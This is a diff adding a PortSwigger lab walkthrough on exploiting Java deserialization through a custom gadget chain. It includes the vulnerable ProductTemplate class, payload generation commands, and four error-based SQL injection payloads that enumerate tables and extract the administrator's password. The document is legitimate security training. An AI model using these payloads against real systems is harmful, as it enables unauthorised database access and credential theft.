@@ -338,3 +338,189 @@ Send request containing the generated payload
 Done!
 ![](imgs/2023-10-30-21-24-21.png)
 
+### Lab 08: Developing a custom gadget chain for Java deserialization
+[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)
+
+
+The cookie after i login successfully with the credentials wiener:peter
+![](imgs/2023-10-31-14-55-58.png)
+
+Cookie:
+```
+B64 Encoding:
+rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBpdnhkeDM0dTN5M2w0bDB4bHFwY3Fkbnhwb2J1a3Jya3QABndpZW5lcg==
+
+B64 Decode:
+
+```
+In repsonse, there is a hint...
+![](imgs/2023-10-31-14-58-34.png)
+
+So i check the sitemap
+
+![](imgs/2023-10-31-15-03-46.png)
+
+
+/backup/AccessTokenUser.java
+```
+package data.session.token;
+
+import java.io.Serializable;
+
+public class AccessTokenUser implements Serializable
+{
+    private final String username;
+    private final String accessToken;
+
+    public AccessTokenUser(String username, String accessToken)
+    {
+        this.username = username;
+        this.accessToken = accessToken;
+    }
+
+    public String getUsername()
+    {
+        return username;
+    }
+
+    public String getAccessToken()
+    {
+        return accessToken;
+    }
+}
+```
+
+Also, i take a host's directory scanning :>
+![](imgs/2023-10-31-15-11-07.png)
+
+Result: There is a file called ProductTemplate.java in the same directory of the AccessTokenUser.java.
+
+ProductTemplate.java
+```
+package data.productcatalog;
+
+import common.db.JdbcConnectionBuilder;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
+
+public class ProductTemplate implements Serializable
+{
+    static final long serialVersionUID = 1L;
+
+    private final String id;
+    private transient Product product;
+
+    public ProductTemplate(String id)
+    {
+        this.id = id;
+    }
+
+    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
+    {
+        inputStream.defaultReadObject();
+
+        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
+                "org.postgresql.Driver",
+                "postgresql",
+                "localhost",
+                5432,
+                "postgres",
+                "postgres",
+                "password"
+        ).withAutoCommit();
+        try
+        {
+            Connection connect = connectionBuilder.connect(30);
+            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
+            Statement statement = connect.createStatement();
+            ResultSet resultSet = statement.executeQuery(sql);
+            if (!resultSet.next())
+            {
+                return;
+            }
+            product = Product.from(resultSet);
+        }
+        catch (SQLException e)
+        {
+            throw new IOException(e);
+        }
+    }
+
+    public String getId()
+    {
+        return id;
+    }
+
+    public Product getProduct()
+    {
+        return product;
+    }
+}
+```
+
+"```String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);```" seems can be injected because the id parameter is controlled by the ProductTemplate object's id - which can be defined by us.
+
+I save the ProductTemplate.java content to [data/productcatalog/ProductTemplate.java](./lab08_payload/) (ofc with some modifications :>)
+
+So i wrote [payload_generate](./lab08_payload/payload_generate.java) to generate the serialized payload we want. 
+
+![](imgs/2023-10-31-18-17-42.png)
+
+```
+cd ./lab08_payload
+javac ./payload_generate.java
+java Serialize <payload-here>
+cat ./payload.ser | base64 -w0
+```
+
+I tried with the payload ```1';--```
+![](imgs/2023-10-31-18-23-34.png)
+![](imgs/2023-10-31-18-24-15.png)
+
+Seem promising...
+![](imgs/2023-10-31-19-49-47.png)
+
+
+Payload #1:
+```
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 ) as int) and '1'='1
+```
+![](imgs/2023-10-31-20-01-24.png)
+-> Table 'users' may contains the credentials information
+
+Payload #2:
+```
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) as int) and '1'='1
+```
+![](imgs/2023-10-31-20-10-05.png)
+
+-> Column 0: 'username' 
+
+Payload #3:
+```
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1) as int) and '1'='1
+```
+
+![](imgs/2023-10-31-20-08-37.png)
+-> Column 1: 'password' 
+
+Payload #4:
+```
+' and 1=cast((SELECT password FROM users WHERE username='administrator' LIMIT 1) as int) and '1'='1
+```
+heheboiz...
+![](imgs/2023-10-31-20-13-32.png)
+
+![](imgs/2023-10-31-20-14-44.png)
+
+![](imgs/2023-10-31-20-15-01.png)
+
+### Lab 09: Developing a custom gadget chain for PHP deserialization
+[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
+
